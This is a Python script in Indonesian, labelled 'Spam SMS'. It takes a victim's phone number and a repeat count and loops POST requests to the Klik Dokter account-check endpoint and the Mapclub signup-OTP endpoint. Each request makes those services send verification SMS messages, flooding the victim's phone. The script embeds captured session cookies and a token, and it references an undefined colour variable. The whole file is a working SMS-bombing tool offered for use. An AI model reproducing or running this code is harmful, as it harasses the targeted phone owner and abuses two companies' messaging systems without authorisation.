import requests, os, sys, time, random
from terminaltables import DoubleTable
# Author ? gada mek !
m = '\x1b[1;91m'
u = '\x1b[1;95m'
i = '\x1b[1;92m'
p = '\x1b[1;37m'
k = '\x1b[1;33m'
b = '\x1b[1;34m'
r = '\x1b[0m'
mp = '\x1b[1;101m'
pm = '\x1b[1;107m'
# ---------* ~ *-----------
def bomm(kntl):
       for i in kntl + '\n':
               sys.stdout.write(random.choice([m,u,h,p,k,b])+i);sys.stdout.flush();time.sleep(00.02)
def klikdok():
        nomor = int(input(f'{m}[{p}?{m}]{p} Nomor : '))
        jumlah = int(input(f'{m}[{p}?{m}]{p} Jumlah : '))

        heder = {
            'Host': 'm.klikdokter.com','Connection': 'keep-alive','Cache-Control': 'max-age=0','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','X-Requested-With': 'mark.via.gp','Referer': 'https://m.klikdokter.com/users/create','Accept-Encoding': 'gzip, deflate','Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','Cookie': 'user_token=1oS3AEEoTi9yzIwtcX3UyJdHRgq6iLnfnlS3dU5i; _fbp=fb.1.1592181755616.583780500; login_username=eyJpdiI6Im1wUXcwMTNIQW1RWlNGWVlcL1l0VHB3PT0iLCJ2YWx1ZSI6IlcyMjgzUmJFSDZPOWJKK1Ftb0dxRFlsVHlVdjNpOFE1TUhOaUZkczV0Rk09IiwibWFjIjoiYjdmNjJhNzkzZDJiMmVjODc4YmVjMDZiNjUyZTFmYzFlMWQwZmQ2OWQyNmU4MWJjYzJjMWU4MWU2ZjgwMzFiZSJ9; login_data=eyJpdiI6IjNBRnRoQmphaElKUVE2RG5odnFsTGc9PSIsInZhbHVlIjoiRW9XNit3MXJndlpuZ3BBY1RiYmdONDVlTlNZeVRCZFozcE5SQmJsVCt6R3greGpYTmVLM3VNVVlXa0hNSHdzZCIsIm1hYyI6IjczODJlMjM4MGEzZDIwNDYzMjhkNGQ5OWNkZGM2OTMzMTQ4ZTllYjY0NjMxOGFlMzUyZDI1YjAxNmQ4NTg1MzcifQ%3D%3D; step=eyJpdiI6ImE2bDJpZmQ4MFl3bkxuMHI2U1oza2c9PSIsInZhbHVlIjoiYmhSb1dYOTQ4azBmUEJmV1k0MHkwZz09IiwibWFjIjoiNTQwYWIxMDFiNjFlYmQ5NDQ2MGNiNGE3YmNmZWE1N2NhZmYyZjRkNGU0MmRlY2NlNzAwM2JiMTZhYzMxOWIyOCJ9; reg_data=eyJpdiI6IkI2UjU5Y3ZWT1o4STZpOEt2UjkxVEE9PSIsInZhbHVlIjoiUzh6a1dUcEl6SzYyZHNydG1RaDNqZUZJNFFlXC9lZk9TN2hVK01UQ3BcLzlWMzJqNWxyNCtHRUJoUmRyaEJnSTdHclNCdlhWTXEwYjY2V1ZvVGg1d04xUGZLMlVKWjhzekhZdnUyNGdySm04bVh6V0pJaFlGblgzU1JaVXhqSHE3cCIsIm1hYyI6IjMxNTBjYjZhZjgyMDE4Yjg0OTUwYWM1ZjQ0ZTYxM2I3MmQyZDI4MGIzNmQ5Nzk1YTZjOTFhYWEwOWE4ZjFlMjMifQ%3D%3D; upgraded_laravel_session=eyJpdiI6IjFDbHBsMVYza2k1V3BLWEhjVUQ2UHc9PSIsInZhbHVlIjoiQnR6eDdkbEZJdWJNT1dNWmpqXC9vZDk4Y09Qb1ZhR01kRmI5TWZ2TExPZFA3YlFFSDFjdjA2emJnZ1p5dmlqcG1qM28rTk13bk12ZXpnSVJmVkxZWjd3PT0iLCJtYWMiOiIwMjQzZjg4ZTFhZTE3NWQ0MTU3MmYxZGI1NjcwNjQ5YTM1OGU4YzU3NjU3ZDA2YzdmNjM2YmZhZjU5NGRkYzMyIn0%3D'}

        data = {
            '_token': '1oS3AEEoTi9yzIwtcX3UyJdHRgq6iLnfnlS3dU5i','full_name': 'Mhank+BarBar','email': 'mhank@barbar.com','phone': nomor,'back-to': '','submit': 'Daftar'}
        for i in range(jumlah):
                req = requests.post('https://m.klikdokter.com/users/check',headers=heder, data=data)
                ntapz = [
                        ["\033[1;32mtarget\033[0m","\033[1;33mjumlah\033[0m","\033[1;36mstatus\033[0m","\x1b[1;33mterkirim\x1b[0m"],
                        [nomor,jumlah,req.status_code,i+1]
                        ]
                gas = DoubleTable(ntapz)
                print(end=f'\r\a{gas.table}',flush=True);time.sleep(10)
#                if 'sessions/auth?user=' in req:
#                    print(f'{m}[{p}+{m}]{p} Berhasil')
#                    for wait in range(10):
#                        print(end=f'\r{m}[{p}{10-(wait+1)}{h}s{p}] ',flush=True)

#                        time.sleep(1)
#                else:
#                    print(f'{m}[{p}x{m}]{p} Gagal')
#                    for wait in range(10):
#                        print(end=f'\r{m}[{p}{10-(wait+1)}{h}s{p}] ',flush=True)
#                        time.sleep(1)

def mapclub():
        nomor = int(input(f'{m}[{p}?{m}]{p} Nomor : '))
        jumlah = int(input(f'{m}[{p}?{m}]{p} Jumlah : '))
        if jumlah >11:
                sys.exit(f'{p}[{m}!{p}]{m} Max 11 Spam')
        heder = {
        'Host': 'cmsapi.mapclub.com','Connection': 'keep-alive','Access-Control-Request-Method': 'POST','Origin': 'https://www.mapclub.com','User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36','Access-Control-Request-Headers': 'content-type','Accept': '*/*','X-Requested-With': 'mark.via.gp','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://www.mapclub.com/en/user/signup','Accept-Encoding': 'gzip, deflate','Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

        data = {
        "phone": nomor}

        for i in range(jumlah):
                uw = requests.post('https://cmsapi.mapclub.com/api/signup-otp',headers=heder, data=data).text
                if '"code":200' in uw:
                        print(f'\r{m}[{p}{i+1}{m}]{p}Sukses',end='')
                        time.sleep(5)
                elif "<!DOCTYPE html>" in uw:
                        print(f'\r{m}[{p}{i+1}{m}]{p}Gagal',end='')
                        time.sleep(5)
os.system('clear')
while(True):
#    os.system('clear')
    try:
        print(f'''

            {p}[ {m}Spam {i}SMS {p}]

{p}┈┈{k}▕╲{m}▂▂▂▂{k}╱▏{p}┈┈┈┈┈┈
┈┈┈{k}╲╱╭╱╲╱╲{p}┈┈┈┈┈┈
┈{k}╱▔▔┈┊▏▕▏▕{p}┈┈┈┈┈┈
{k}▕▂╱▔╳▔╲{m}▊{k}▏{m}▊{k}╱▔╲▔╲{p}┈
┈┈┈┈{k}▏▕▏▔▔▔{m}▕▋{k}▕{m}▕▋{k}▏
{p}┈┈┈┈{k}╲┈{k}╲▂▂▂▂▂▂▂╱{p}┈
┈┈┈┈{k}▕╲▂▂▂▂▂╱{p}┈┈┈┈
┈┈┈{i}╱▔╲▕{p}┈┈┈┈┈┈┈┈┈
{m}[{p}1{m}]{p} Klik Dokter
{m}[{p}2{m}]{p} Mapclub
{m}[{p}3{m}]{p} Exit''')
        print(f'{mp}         {pm}          {r}')
        pilih = input(f'{m}[{p}?{m}]{p} Pilih _> ')
        if pilih in '1':
                klikdok()
        elif pilih in '2':
                mapclub()
        elif pilih in '3':
            break
        else:
            print(f'{m}[{p}!{m}]{p} Salah')

    except Exception as f:
        sys.exit(f)
